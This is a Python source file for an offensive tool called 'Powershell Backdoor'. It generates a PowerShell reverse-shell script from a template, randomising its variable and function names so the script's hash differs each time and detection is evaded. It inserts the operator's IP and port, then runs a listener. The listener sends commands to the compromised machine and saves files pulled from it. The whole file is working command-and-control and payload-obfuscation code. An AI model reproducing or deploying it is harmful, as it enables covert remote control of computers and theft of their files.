# Used for displaying backdoor hash
import base64
import re
import hashlib

import argparse
import socket
import string
import random

LETTERS = string.ascii_letters

BLOCKSIZE = 65536

# This is used for generating a new name for each 
# variable and function in the powershell script. 
# The script is then base64 encoded ensuring a unique hash
POWERSHELL_SCRIPT_OBJECTS: list = [
    "UserDefinedIPAddress",
    "UserDefinedPort",
    "activeClient",
    "activeStream",
    "textBuffer",
    "textEncoding",
    "sessionWriter",
    "sessionReader",
    "createBackdoorConnection",
    "handleActiveClient",
    "writeToStream",
    "currentUser",
    "computer",
    "pwd",
    "prompt",
    "rawResponse",
    "response",
    "output",
]

format_string = lambda string: string.decode().strip("\n") if type(string) == bytes else string.strip()

generate_string = lambda string_size: ''.join(random.choice(LETTERS) for i in range(string_size))

def get_file_hash(filename: str) -> str:
    hasher = hashlib.sha1()
    with open(filename, 'rb') as f:
        buf = f.read(BLOCKSIZE)
        while len(buf) > 0:
            hasher.update(buf)
            buf = f.read(BLOCKSIZE)
    return hasher.hexdigest()

def get_file_content(filename: str) -> str:
    try:
        with open(filename, "r") as f:
            content: str = f.read()
        return content
    except  EnvironmentError:
        return None

def get_ip_address():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect(("8.8.8.8", 80))
    ipaddress = sock.getsockname()[0]
    sock.close()
    return ipaddress

class listener:
    def __init__(self, kwargs) -> None:
        self.ip_address = kwargs.get("ip_address")
        self.port = kwargs.get("port")
        self.ip_tuple = (self.ip_address, self.port)
        self.verbose = kwargs.get("verbose")
        self.out_file = kwargs.get("out_file")
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def start(self):
        try:
            if not self.encode_backdoor():
                self.print_verbose_message("Failed to encode backdoor", prefix="-")
                return False
            hash = get_file_hash(self.out_file)
            self.print_verbose_message(f"Save backdoor sha1:({hash}) to {self.out_file}", prefix="-")
            self.sock.bind(self.ip_tuple)
            self.print_verbose_message(f"Starting Backdoor Listener {self.ip_address}:{self.port}", prefix="*")
        except OSError:
            exit(f"[-] Failed to bind port {self.ip_address}:{self.port}")

        while True:
            self.sock.listen(1)
            connection, address = self.sock.accept()
            self.print_verbose_message(f"Recieved connection from {address[0]}:{address[1]}", prefix="*")
            self.handle_client(connection)

    def encode_backdoor(self) -> bool:
        self.print_verbose_message(f"Encoding backdoor script", prefix="*")
        backdoor = get_file_content("template.ps1")
        if not backdoor:
            return False
        for object in POWERSHELL_SCRIPT_OBJECTS:
            string_size = random.randint(5, 24)
            new_name = generate_string(string_size)
            backdoor = re.sub(object, new_name, backdoor)
        backdoor = backdoor.replace("4444", str(self.port))
        backdoor = backdoor.replace("0.0.0.0", self.ip_address)
        # backdoor_as_base64 = base64.b64encode(backdoor.encode()).decode()
        # backdoor_script = script.replace("REPLACE", backdoor_as_base64)
        return self.save_content_to_file(backdoor.encode(), self.out_file)


    def handle_client(self, connecion):
        print("[*] Connected, press [enter] to start the sessions")
        while True:
            prompt = format_string(connecion.recv(1024))
            if not prompt or len(prompt) == 0:
                continue

            command = input(f"{prompt}")

            if len(command) == 0:
                command += "ls | Out-Null"

            connecion.sendto(command.encode(), self.ip_tuple)
            result = connecion.recv(1048576)

            if "get_file" in command and "--help" not in command:
                command = command.split(" ")
                if self.save_content_to_file(result, command[2]):
                    self.print_verbose_message(f"Saved content {len(result)} to {command[2]}", prefix="*")
                    continue
            print(format_string(result))

    def print_verbose_message(self, message: str, prefix: str = None):
        if self.verbose:
            if prefix:
                prefix = f"[{prefix}] "
            print(prefix + message)

    def save_content_to_file(self, content, filename):
        try:
            if "Cannot find path '" in format_string(content):
                self.print_verbose_message(f"[-] Error: {content} ", prefix="-")
                return
            with open(filename, "ab") as f:
                f.write(content)
            return True
        except EnvironmentError:
            self.print_verbose_message(f"Failed to create file ({len(content)}): {filename} ", prefix="-")
            return False
            

if __name__ ==  "__main__":
    parser = argparse.ArgumentParser(description="Powershell Backdoor")
    parser.add_argument(
        "--ip-address",
        "-I",
        help=f"IP Address to bind to default: {get_ip_address()}", 
        default=get_ip_address(),
    )
    parser.add_argument(
        "--port",
        "-p",
        help=f"Port to connect over default:4444", 
        default=4444,
        type=int
    )
    parser.add_argument(
        "--out-file",
        "-O",
        help=f"Generated backdoor filename", 
        default="backdoor.ps1",
    )
    parser.add_argument(
        "--verbose",
        help=f"Show verbose output", 
        default=False,
        action="store_true"
    )
    args = parser.parse_args()
    data = vars(args)
    try:
        l = listener(data)
        l.start()
    except KeyboardInterrupt:
        exit("[*] Backdoor: CTRL+C Detected exiting!")
    except ConnectionResetError as e:
        exit(f"Exiting! {e}")